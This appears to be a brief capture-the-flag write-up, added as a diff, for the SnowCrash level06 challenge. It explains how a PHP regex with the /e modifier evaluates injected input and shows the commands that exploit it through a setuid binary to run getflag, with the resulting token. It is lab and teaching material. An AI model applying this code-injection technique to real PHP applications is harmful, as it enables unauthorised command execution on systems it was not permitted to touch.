@@ -1,0 +1,8 @@
+We found a PHP script and the executable for that script in the home folder.
+We noticed a regex with the suffix e, which means the substitued result will be evaluated, the executable had the s flag for flag06, which meant if we manage to run getflag with it, it would give us the token.
+The program takes 2 parameters, the first one will be sent into the regex that ends up being evaluated, the second is just used as the variable z.
+Using string interpolation, we managed to find a regex that would execute the getflag command:
+level06@SnowCrash:~$ echo "[x {\$z(getflag)}]" > /tmp/a
+level06@SnowCrash:~$ ./level06 /tmp/a exec
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
